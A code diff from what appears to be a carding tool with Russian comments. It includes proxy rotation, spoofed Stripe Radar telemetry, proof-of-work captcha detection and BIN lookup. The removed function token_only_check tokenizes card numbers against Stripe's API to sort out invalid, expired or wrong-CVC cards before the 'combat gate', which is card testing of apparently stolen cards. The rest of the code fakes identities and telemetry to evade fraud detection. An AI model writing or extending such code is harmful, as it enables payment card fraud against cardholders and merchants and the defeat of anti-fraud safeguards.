@@ -102,9 +102,6 @@ GEO_POOLS: dict[str, list[tuple[str, str, str]]] = {
     "SE": [("Stockholm", "AB", "11120"), ("Goteborg", "O", "41118"), ("Malmo", "M", "21122")],
     "PT": [("Lisboa", "LI", "1000"), ("Porto", "PO", "4000"), ("Braga", "BG", "4700")],
 }
-_CITIES = [c for c, _, _ in GEO_POOLS["US"]]
-_STATES = [s for _, s, _ in GEO_POOLS["US"]]
-_ZIPS = [z for _, _, z in GEO_POOLS["US"]]
 
 _STREETS = ["Main", "Oak", "Maple", "Cedar", "Park", "Lake", "Hill", "Church"]
 
@@ -263,8 +260,8 @@ def mask_pan(raw: str) -> str:
 
 
 # --- Прокси-слой: пул data/proxies.txt + ротация ---
-
-PROXIES_FILE = os.path.join("data", "proxies.txt")
+_ROOT_DIR = os.path.dirname(os.path.abspath(__file__))
+PROXIES_FILE = os.path.join(_ROOT_DIR, "data", "proxies.txt")
 
 
 def _is_valid_port(port_str: str) -> bool:
@@ -579,18 +576,13 @@ def solve_pow_challenge(challenge_data: dict) -> dict | None:
     return None
 
 
-def parse_stripe_cookies(set_cookie_headers: list[str] | None) -> dict:
-    """__stripe_mid/__stripe_sid из Set-Cookie ответа m.stripe.com/6.
-    Возвращает {"mid": ..., "sid": ...} — отсутствующие ключи пустые."""
-    out = {"mid": "", "sid": ""}
-    for raw in set_cookie_headers or []:
-        for part in str(raw).split(";"):
-            name, _, value = part.strip().partition("=")
-            if name == "__stripe_mid" and not out["mid"]:
-                out["mid"] = value.strip()
-            elif name == "__stripe_sid" and not out["sid"]:
-                out["sid"] = value.strip()
-    return out
+def detect_pow_type(html: str) -> dict | None:
+    """Inspects HTML for PoW captcha widgets (Altcha or Friendly Captcha)."""
+    try:
+        from captcha_pow import detect_pow_type as _detect
+        return _detect(html)
+    except Exception:
+        return None
 
 
 def m_stripe_beacon_payload() -> dict:
@@ -937,7 +929,7 @@ def stripe_telemetry(base_url: str, pk: str, country_code: str = "US",
                      muid: str = "", sid: str = "", email: str = "",
                      phone: str = "") -> dict:
     """Radar Telemetry v2021 — payment-element, deferred-intent, полный набор attribution.
-    muid/sid: живые значения из Set-Cookie m.stripe.com/6 (parse_stripe_cookies);
+    muid/sid: живые значения из Set-Cookie m.stripe.com/6 (parse_m_stripe_response);
     пустые → uuid4 fallback. guid остаётся uuid4 всегда (per-pageload)."""
     geo = geo_identity_fields(country_code)
     first = random.choice(FIRST_NAMES)
@@ -1274,36 +1266,6 @@ async def bin_lookup_enriched(bin6: str) -> dict:
     # честно оставляем None (unknown)
     return merged
 
-
-async def token_only_check(s, pk: str, card_raw: str, referrer: str,
-                           telem: dict | None = None) -> dict:
-    """2.6: токенизация без confirm — cvc_check за $0. Отбраковка синтаксики
-    и мёртвых карт до боевого гейта. Возвращает {status, detail}."""
-    if not pk.startswith("pk_live"):
-        return {"status": "ERROR", "detail": "prefilter pk missing"}
-    card = parse_card(card_raw)
-    telem = telem or stripe_telemetry(referrer, pk)
-    tok_body = tokenize_body(card, telem, referrer)
-    try:
-        r = await s.post("https://api.stripe.com/v1/payment_methods",
-                         data=tok_body, headers=TOKENIZE_HEADERS, timeout=8)
-        d = r.json()
-    except Exception as e:
-        return {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:150]}
-    if "id" in d:
-        return {"status": "OK", "detail": f"token {d['id'][:18]}..."}
-    err = d.get("error", {})
-    code = str(err.get("code", ""))
-    msg = str(err.get("message", ""))[:150]
-    if code == "incorrect_cvc":
-        return {"status": "WRONG_CVC", "detail": msg}
-    if code in ("invalid_number", "incorrect_number"):
-        return {"status": "INVALID", "detail": msg}
-    if "expired" in msg.lower():
-        return {"status": "EXPIRED", "detail": msg}
-    if "api key" in msg.lower():
-        return {"status": "RESTRICTED", "detail": msg}
-    return {"status": classify_verdict(msg + code), "detail": msg}
 
 
 RE_BRAINTREE_SETUP = re.compile(r'braintree\.setup\(\s*["\']([^"\']+)["\']')
